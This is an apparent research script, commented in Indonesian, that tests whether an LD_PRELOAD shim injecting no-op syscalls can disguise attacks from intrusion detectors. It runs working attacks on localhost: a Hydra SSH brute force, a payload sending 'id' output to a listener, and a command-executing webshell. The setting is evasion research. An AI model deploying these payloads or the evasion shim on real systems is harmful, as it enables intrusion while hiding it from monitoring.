#!/usr/bin/env bash
# functional_validation_v2.sh — #1 / LEVEL 3: bukti ΦF MULTI-PAYLOAD.
#
# Memperluas validasi fungsional dari satu kelas (Hydra) ke TIGA kelas serangan
# yang memetakan ke kategori ADFA, semua dijalankan NYATA, lokal, terisolasi:
#   1. brute_force   (Hydra SSH)            -> ADFA Hydra_SSH/Hydra_FTP
#   2. reverse_shell (C2 post-exploitation) -> ADFA Meterpreter (mirip)
#   3. webshell      (RCE via web)          -> ADFA Web_Shell
#
# Untuk tiap kelas: jalankan baseline lalu DENGAN shim no-op (LD_PRELOAD yang
# menyuntik getpid/getuid/gettimeofday ke connect/accept/sendto/recvfrom), dan
# verifikasi OUTCOME FUNGSIONAL identik (ΦF). strace -c mencatat no-op tersuntik.
#
# CVE nyata sengaja TIDAK disertakan (butuh sandbox/eksploit khusus) — future work.
#
# Jalankan di VM:  sudo bash deploy/validation/functional_validation_v2.sh
set -u
SHIM=/tmp/noop_shim2.so
RESULT=/tmp/functional_validation_multi.json
NOOP_PER_CALL="${NOOP_PER_CALL:-5}"
PY=python3

echo "=== [setup] deps + shim ==="
apt-get install -y hydra strace gcc curl >/dev/null 2>&1 || true

cat > /tmp/noop_shim2.c <<'CEOF'
#define _GNU_SOURCE
#include <dlfcn.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
static int npc(void){const char*e=getenv("NOOP_PER_CALL");return e?atoi(e):5;}
static void noops(int n){struct timeval tv;for(int i=0;i<n;i++){syscall(SYS_getpid);syscall(SYS_getuid);syscall(SYS_gettimeofday,&tv,NULL);}}
#define WRAP(ret,name,sig,call) \
  static ret(*real_##name)sig=NULL; \
  ret name sig { if(!real_##name) real_##name=dlsym(RTLD_NEXT,#name); noops(npc()); ret r=real_##name call; noops(npc()); return r; }
WRAP(int, connect, (int a,const struct sockaddr*b,socklen_t c),(a,b,c))
WRAP(int, accept,  (int a,struct sockaddr*b,socklen_t*c),(a,b,c))
WRAP(int, accept4, (int a,struct sockaddr*b,socklen_t*c,int d),(a,b,c,d))
WRAP(ssize_t, sendto,(int a,const void*b,size_t c,int d,const struct sockaddr*e,socklen_t f),(a,b,c,d,e,f))
WRAP(ssize_t, recvfrom,(int a,void*b,size_t c,int d,struct sockaddr*e,socklen_t*f),(a,b,c,d,e,f))
WRAP(ssize_t, send, (int a,const void*b,size_t c,int d),(a,b,c,d))
WRAP(ssize_t, recv, (int a,void*b,size_t c,int d),(a,b,c,d))
CEOF
gcc -shared -fPIC -o "$SHIM" /tmp/noop_shim2.c -ldl && echo "  shim built" || { echo "FAIL shim"; exit 1; }

# ---- payload scripts ----
cat > /tmp/rs_listener.py <<'PEOF'
import socket,sys
s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("127.0.0.1",9001));s.listen(1)
c,_=s.accept();data=b""
while True:
    b=c.recv(4096)
    if not b:break
    data+=b
open("/tmp/rs_out.txt","wb").write(data);c.close();s.close()
PEOF
cat > /tmp/rs_payload.py <<'PEOF'
import socket,subprocess
out=subprocess.run(["id"],capture_output=True).stdout
s=socket.socket();s.connect(("127.0.0.1",9001));s.sendall(out);s.close()
PEOF
cat > /tmp/webshell.py <<'PEOF'
from http.server import BaseHTTPRequestHandler,HTTPServer
import subprocess,urllib.parse,sys
PORT=int(sys.argv[1]) if len(sys.argv)>1 else 8080
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        q=urllib.parse.urlparse(self.path).query
        cmd=urllib.parse.parse_qs(q).get("cmd",["echo no"])[0]
        o=subprocess.run(cmd,shell=True,capture_output=True).stdout
        self.send_response(200);self.end_headers();self.wfile.write(o)
    def log_message(self,*a):pass
HTTPServer.allow_reuse_address=True
_srv=HTTPServer(("127.0.0.1",PORT),H)
# mode "once": layani satu request lalu exit sendiri (agar strace -c exit bersih & flush ringkasan)
if len(sys.argv)>2 and sys.argv[2]=="once": _srv.handle_request()
else: _srv.serve_forever()
PEOF

run_strace(){ # $1=outfile $2=preload(1/0) ; rest=cmd
  local out="$1" pre="$2"; shift 2
  if [ "$pre" = "1" ]; then strace -f -c -o "$out" -E LD_PRELOAD="$SHIM" "$@" 2>/dev/null
  else strace -f -c -o "$out" "$@" 2>/dev/null; fi
}
noopsum(){ awk '/getpid|getuid|gettimeofday/{s+=$4} END{print s+0}' "$1"; }
total(){ awk '/total/{print $4}' "$1"|tail -1; }

# ========== TEST 1: brute_force (Hydra) ==========
echo "=== [1/3] brute_force (Hydra SSH) ==="
id victim >/dev/null 2>&1 || useradd -m victim; echo 'victim:hunter2'|chpasswd
printf 'admin\npassword\nhunter2\nroot\n' > /tmp/wl.txt
BF_BASE=$(run_strace /tmp/bf_b.txt 0 hydra -l victim -P /tmp/wl.txt -t1 ssh://127.0.0.1; echo X)
hydra -l victim -P /tmp/wl.txt -t1 ssh://127.0.0.1 2>/dev/null | grep -q "password: hunter2" && BF_B=1 || BF_B=0
NOOP_PER_CALL=$NOOP_PER_CALL strace -f -c -o /tmp/bf_s.txt -E LD_PRELOAD=$SHIM hydra -l victim -P /tmp/wl.txt -t1 ssh://127.0.0.1 2>/dev/null | grep -q "password: hunter2" && BF_S=1 || BF_S=0
userdel -r victim 2>/dev/null

# ========== TEST 2: reverse_shell ==========
echo "=== [2/3] reverse_shell (C2 post-exploitation) ==="
rm -f /tmp/rs_out.txt; $PY /tmp/rs_listener.py & L1=$!; sleep 1
run_strace /tmp/rs_b.txt 0 $PY /tmp/rs_payload.py; sleep 1
grep -q "uid=" /tmp/rs_out.txt && RS_B=1 || RS_B=0; wait $L1 2>/dev/null
rm -f /tmp/rs_out.txt; $PY /tmp/rs_listener.py & L2=$!; sleep 1
NOOP_PER_CALL=$NOOP_PER_CALL strace -f -c -o /tmp/rs_s.txt -E LD_PRELOAD=$SHIM $PY /tmp/rs_payload.py; sleep 1
grep -q "uid=" /tmp/rs_out.txt && RS_S=1 || RS_S=0; wait $L2 2>/dev/null

# ========== TEST 3: webshell ==========
echo "=== [3/3] webshell (RCE via web) ==="
pkill -f /tmp/webshell.py 2>/dev/null; sleep 1   # bersihkan sisa run sebelumnya
# baseline di port 8080
$PY /tmp/webshell.py 8080 & W1=$!; sleep 1
curl -s "http://127.0.0.1:8080/?cmd=id" | grep -q "uid=" && WS_B=1 || WS_B=0
kill $W1 2>/dev/null; sleep 1
# shimmed di port 8081 — server mode "once": layani 1 request lalu EXIT SENDIRI, sehingga
# strace -c exit bersih dan menulis ringkasan. (Bug lama: serve_forever + `kill` SIGTERM
# mematikan strace sebelum flush -> ws_s.txt kosong -> noop tercatat 0, artefak pengukuran.
# brute_force/reverse_shell self-terminate, jadi tak pernah kena bug ini.)
NOOP_PER_CALL=$NOOP_PER_CALL strace -f -c -o /tmp/ws_s.txt -E LD_PRELOAD=$SHIM $PY /tmp/webshell.py 8081 once & W2=$!; sleep 1
curl -s "http://127.0.0.1:8081/?cmd=id" | grep -q "uid=" && WS_S=1 || WS_S=0
wait $W2 2>/dev/null; sleep 1

# ========== verdict + JSON ==========
phi(){ [ "$1" = 1 ] && [ "$2" = 1 ] && echo true || echo false; }
cat > "$RESULT" <<JSON
{
  "noop_per_call": $NOOP_PER_CALL,
  "brute_force":   {"adfa_class":"Hydra_SSH","baseline_ok":$([ $BF_B = 1 ]&&echo true||echo false),"shimmed_ok":$([ $BF_S = 1 ]&&echo true||echo false),"phi_F":$(phi $BF_B $BF_S),"noop_baseline":$(noopsum /tmp/bf_b.txt),"noop_shimmed":$(noopsum /tmp/bf_s.txt)},
  "reverse_shell": {"adfa_class":"Meterpreter","baseline_ok":$([ $RS_B = 1 ]&&echo true||echo false),"shimmed_ok":$([ $RS_S = 1 ]&&echo true||echo false),"phi_F":$(phi $RS_B $RS_S),"noop_baseline":$(noopsum /tmp/rs_b.txt),"noop_shimmed":$(noopsum /tmp/rs_s.txt)},
  "webshell":      {"adfa_class":"Web_Shell","baseline_ok":$([ $WS_B = 1 ]&&echo true||echo false),"shimmed_ok":$([ $WS_S = 1 ]&&echo true||echo false),"phi_F":$(phi $WS_B $WS_S),"noop_shimmed":$(noopsum /tmp/ws_s.txt)}
}
JSON

echo
echo "------------------------------------------------------------"
echo "VALIDASI FUNGSIONAL MULTI-PAYLOAD (ΦF)"
printf "  %-14s base=%s shim=%s  ΦF=%s  noop(base->shim)=%s->%s\n" "brute_force"   "$BF_B" "$BF_S" "$(phi $BF_B $BF_S)" "$(noopsum /tmp/bf_b.txt)" "$(noopsum /tmp/bf_s.txt)"
printf "  %-14s base=%s shim=%s  ΦF=%s  noop(base->shim)=%s->%s\n" "reverse_shell" "$RS_B" "$RS_S" "$(phi $RS_B $RS_S)" "$(noopsum /tmp/rs_b.txt)" "$(noopsum /tmp/rs_s.txt)"
printf "  %-14s base=%s shim=%s  ΦF=%s  noop(shim)=%s\n"           "webshell"      "$WS_B" "$WS_S" "$(phi $WS_B $WS_S)" "$(noopsum /tmp/ws_s.txt)"
echo "  JSON: $RESULT"
echo "------------------------------------------------------------"
